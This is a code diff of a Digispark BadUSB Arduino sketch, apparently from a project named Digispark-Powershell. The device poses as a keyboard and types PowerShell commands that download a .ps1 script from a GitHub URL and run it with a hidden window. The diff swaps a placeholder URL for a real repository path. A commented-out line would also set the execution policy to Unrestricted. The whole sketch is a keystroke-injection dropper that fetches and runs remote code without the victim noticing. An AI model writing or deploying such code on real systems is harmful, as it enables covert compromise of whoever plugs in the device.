@@ -15,7 +15,7 @@ void loop() {
     DigiKeyboard.print("$client = new-object System.Net.WebClient");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(500);
-    DigiKeyboard.print("$client.DownloadFile(\"https://scriptURL\" , \"script.ps1\")");
+    DigiKeyboard.print("$client.DownloadFile(\"https://github.com/xLevix/Digispark-Powershell/blob/master/src/test.ps1\" , \"test.ps1\")");
     DigiKeyboard.delay(1000);
     DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT | KEY_R);
     DigiKeyboard.delay(750);
@@ -28,7 +28,7 @@ void loop() {
     //DigiKeyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
     //DigiKeyboard.sendKeyStroke(KEY_ENTER);
     //DigiKeyboard.delay(750);
-    DigiKeyboard.print("powershell.exe -windowstyle hidden -File %USERPROFILE%\\script.ps1");
+    DigiKeyboard.print("powershell.exe -windowstyle hidden -File %USERPROFILE%\\test.ps1");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     for (;;) {
         /*empty*/
